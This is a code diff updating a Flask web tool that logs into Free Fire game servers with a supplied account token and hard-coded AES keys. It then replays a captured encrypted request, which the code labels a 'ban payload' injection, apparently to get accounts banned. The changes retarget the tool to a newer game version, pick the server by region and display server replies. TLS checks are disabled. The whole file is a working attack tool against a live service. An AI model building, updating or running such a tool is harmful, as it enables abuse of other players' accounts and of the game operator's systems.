@@ -1,4 +1,5 @@
 import os
+import sys
 import json
 import base64
 import requests
@@ -22,13 +23,23 @@ except ImportError:
 
 app = Flask(__name__)
 
-# ---------- Constants ----------
-API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
+# ============================================================
+#  🚨  UPDATE THESE FOR YOUR TARGET VERSION (e.g., OB54)  🚨
+# ============================================================
 
+# 1️⃣ Client version (from MajorLogin protobuf)
+CLIENT_VERSION = "1.120.1"                # <-- change to OB54 (e.g., "1.121.1")
+CLIENT_VERSION_CODE = "2019118695"        # <-- change to OB54 code
+
+# 2️⃣ The encrypted payload sent to /GetLoginData (base64 string)
+#    You MUST capture this from the official client.
 BODY_BASE64 = (
     'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUibievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
-)
+)   # <--- REPLACE with your OB54 payload
 
+# ============================================================
+
+# Other constants (unchanged)
 AeSkEy = b'Yg&tc%DEuh6%Zc^8'
 AeSiV  = b'6oyZDr22E3ychjM%'
 mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"
@@ -41,10 +52,10 @@ mLhDr  = {
     "Expect": "100-continue",
     "X-GA": "v1 1",
     "X-Unity-Version": "2018.4.11f1",
-    "ReleaseVersion": "OB53"
+    "ReleaseVersion": "OB54"   # will be overridden by JWT's version
 }
 
-# ---------- Helper functions (unchanged) ----------
+# ---------- Helper functions (copied from your CLI script) ----------
 
 def decode_ff_name(b64_str):
     try:
@@ -74,7 +85,7 @@ def build_majorlogin(tok, open_id, p_type):
     m.event_time = str(datetime.now())[:-7]
     m.game_name = "free fire"
     m.platform_id = p_type
-    m.client_version = "1.120.1"
+    m.client_version = CLIENT_VERSION          # dynamic
     m.system_software = "Android OS 9 / API-28"
     m.system_hardware = "Handheld"
     m.telecom_operator = "Verizon"
@@ -99,7 +110,7 @@ def build_majorlogin(tok, open_id, p_type):
     m.channel_type = 3
     m.cpu_type = 2
     m.cpu_architecture = "64"
-    m.client_version_code = "2019118695"
+    m.client_version_code = CLIENT_VERSION_CODE   # dynamic
     m.login_open_id_type = p_type
     m.origin_platform_type = str(p_type)
     m.primary_platform_type = str(p_type)
@@ -114,6 +125,18 @@ def decode_jwt(token):
         return json.loads(decoded_str)
     except Exception:
         return {}
+
+def get_base_url(lock_region):
+    """Returns the appropriate base client URL based on the account's lock region."""
+    lock_region = lock_region.upper()
+    ind_regions = ["IND"]
+    us_regions = ["BR", "US", "NA", "SAC"]
+    if lock_region in ind_regions:
+        return "https://client.ind.freefiremobile.com"
+    elif lock_region in us_regions:
+        return "https://client.us.freefiremobile.com"
+    else:
+        return "https://clientbp.ggpolarbear.com"
 
 def fetch_majorlogin_jwt(tok):
     """Return (jwt_token, error_message)"""
@@ -174,7 +197,8 @@ def fetch_majorlogin_jwt(tok):
 
     return None, "MajorLogin failed. Account may be blocked or platform mismatch."
 
-def trigger_injection(jwt_token, version):
+def trigger_injection(jwt_token, version, base_url):
+    api_url = f"{base_url}/GetLoginData"
     headers = {
         'Authorization': f'Bearer {jwt_token}',
         'X-Unity-Version': '2018.4.11f1',
@@ -185,7 +209,7 @@ def trigger_injection(jwt_token, version):
         'Accept-Encoding': 'gzip'
     }
     body = base64.b64decode(BODY_BASE64)
-    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)
+    return requests.post(api_url, headers=headers, data=body, timeout=20, verify=False)
 
 # ---------- HTML template (embedded) ----------
 PAGE_TEMPLATE = '''
@@ -212,7 +236,7 @@ PAGE_TEMPLATE = '''
             padding: 40px 50px;
             border-radius: 16px;
             box-shadow: 0 8px 30px rgba(0,0,0,0.7);
-            max-width: 700px;
+            max-width: 800px;
             width: 100%;
             border: 1px solid #2c3545;
         }
@@ -294,6 +318,18 @@ PAGE_TEMPLATE = '''
         .result .msg { margin-top: 15px; font-size: 18px; }
         .msg.error { color: #e74c3c; }
         .msg.success { color: #2ecc71; }
+        .result .server-response {
+            margin-top: 15px;
+            background: #0d121c;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: #bbccdd;
+            border: 1px solid #2c3545;
+        }
         .footer {
             margin-top: 30px;
             text-align: center;
@@ -349,6 +385,11 @@ PAGE_TEMPLATE = '''
             <div class="msg {{ 'success' if result.success else 'error' }}">
                 {{ result.message }}
             </div>
+            {% if result.response_text %}
+            <div class="server-response">
+                <strong>Server response:</strong><br>{{ result.response_text }}
+            </div>
+            {% endif %}
         </div>
         {% endif %}
 
@@ -370,10 +411,8 @@ PAGE_TEMPLATE = '''
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'GET':
-        # Show empty form
         return render_template_string(PAGE_TEMPLATE, result=None)
 
-    # POST: process token
     token = request.form.get('token', '').strip()
     if not token:
         return render_template_string(PAGE_TEMPLATE, result={
@@ -405,9 +444,12 @@ def index():
     account_id = user_data.get('account_id', 'Unknown')
     version = user_data.get('release_version', 'Latest')
 
-    # Step 3: Inject ban payload
+    # Step 3: Determine base URL
+    base_url = get_base_url(region)
+
+    # Step 4: Inject ban payload
     try:
-        ban_resp = trigger_injection(jwt_token, version)
+        ban_resp = trigger_injection(jwt_token, version, base_url)
     except Exception as e:
         return render_template_string(PAGE_TEMPLATE, result={
             'success': False,
@@ -418,6 +460,7 @@ def index():
             'version': version
         })
 
+    # Build result
     if ban_resp.status_code == 200:
         result = {
             'success': True,
@@ -434,7 +477,8 @@ def index():
             'nickname': nickname,
             'account_id': account_id,
             'region': region,
-            'version': version
+            'version': version,
+            'response_text': ban_resp.text[:500]  # show first 500 chars
         }
 
     return render_template_string(PAGE_TEMPLATE, result=result)
